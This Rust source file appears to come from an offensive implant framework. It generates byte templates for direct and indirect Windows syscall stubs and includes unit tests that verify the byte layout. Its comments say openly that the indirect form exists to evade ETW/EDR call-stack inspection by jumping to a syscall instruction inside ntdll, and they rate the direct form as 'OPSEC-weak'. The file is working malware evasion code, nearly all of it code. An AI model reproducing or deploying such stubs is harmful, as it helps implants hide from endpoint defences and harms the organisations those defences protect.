//! Syscall-stub byte templates.
//!
//! A *direct* syscall emits the `syscall` instruction from inside the implant's
//! own memory — ETW/EDR call-stack checks flag this because the return address
//! points outside any legitimate module. An *indirect* syscall instead jumps
//! to a `syscall` instruction *already inside ntdll*, so the executing RIP and
//! return address are legitimate ntdll addresses. These functions emit the
//! templates the PIC implant patches with a resolved SSN (+ the absolute
//! address of an ntdll `syscall` gadget for the indirect form).
//!
//! All encodings are x86_64 little-endian, matching the real ntdll stub layout.

/// The real ntdll x64 prologue: `mov r10, rcx` (`4C 8B D1`).
pub const PROLOGUE_MOV_R10_RCX: [u8; 3] = [0x4C, 0x8B, 0xD1];
/// `mov eax, imm32` opcode byte (followed by the 4-byte SSN).
pub const OP_MOV_EAX_IMM32: u8 = 0xB8;
/// `syscall` (`0F 05`).
pub const SYSCALL: [u8; 2] = [0x0F, 0x05];
/// `ret`.
pub const RET: u8 = 0xC3;

/// `mov r11, imm64` then `jmp r11` (`49 BB <imm64>` `41 FF E3`) — used to jump
/// into an ntdll `syscall` gadget for an indirect syscall.
fn jmp_r11(abs_addr: u64) -> Vec<u8> {
    let mut v = vec![0x49, 0xBB]; // mov r11, imm64
    v.extend_from_slice(&abs_addr.to_le_bytes());
    v.extend_from_slice(&[0x41, 0xFF, 0xE3]); // jmp r11
    v
}

/// Build a *direct* syscall stub: `mov r10,rcx; mov eax,<ssn>; syscall; ret`.
///
/// Functionally correct but OPSEC-weak: the `syscall` executes from implant
/// memory. Prefer [`indirect_stub`].
pub fn direct_stub(ssn: u32) -> Vec<u8> {
    let mut v = Vec::with_capacity(11);
    v.extend_from_slice(&PROLOGUE_MOV_R10_RCX);
    v.push(OP_MOV_EAX_IMM32);
    v.extend_from_slice(&ssn.to_le_bytes());
    v.extend_from_slice(&SYSCALL);
    v.push(RET);
    v
}

/// Build an *indirect* syscall stub:
/// `mov r10,rcx; mov eax,<ssn>; mov r11,<ntdll!syscall>; jmp r11`.
///
/// `ntdll_syscall_abs` is the absolute address of a `syscall` instruction
/// inside ntdll (the PIC implant locates one by scanning ntdll at load time).
/// The `syscall` then executes from ntdll, so its RIP/return address look
/// legitimate to call-stack inspection.
pub fn indirect_stub(ssn: u32, ntdll_syscall_abs: u64) -> Vec<u8> {
    let mut v = Vec::with_capacity(24);
    v.extend_from_slice(&PROLOGUE_MOV_R10_RCX);
    v.push(OP_MOV_EAX_IMM32);
    v.extend_from_slice(&ssn.to_le_bytes());
    v.extend_from_slice(&jmp_r11(ntdll_syscall_abs));
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn direct_stub_byte_layout() {
        let s = direct_stub(0x55);
        assert_eq!(&s[..3], &PROLOGUE_MOV_R10_RCX[..]); // mov r10, rcx
        assert_eq!(s[3], OP_MOV_EAX_IMM32); // mov eax, imm32
        assert_eq!(u32::from_le_bytes([s[4], s[5], s[6], s[7]]), 0x55); // ssn
        assert_eq!(&s[8..10], &SYSCALL); // syscall
        assert_eq!(s[10], RET); // ret
    }

    #[test]
    fn indirect_stub_jumps_into_ntdll() {
        let addr: u64 = 0x00007FF_12345678;
        let s = indirect_stub(0x1A, addr);
        // prologue + ssn
        assert_eq!(&s[..4], &[0x4C, 0x8B, 0xD1, 0xB8]);
        assert_eq!(u32::from_le_bytes([s[4], s[5], s[6], s[7]]), 0x1A);
        // mov r11, addr ; jmp r11
        assert_eq!(&s[8..10], &[0x49, 0xBB]);
        assert_eq!(u64::from_le_bytes(s[10..18].try_into().unwrap()), addr);
        assert_eq!(&s[18..21], &[0x41, 0xFF, 0xE3]); // jmp r11
    }
}
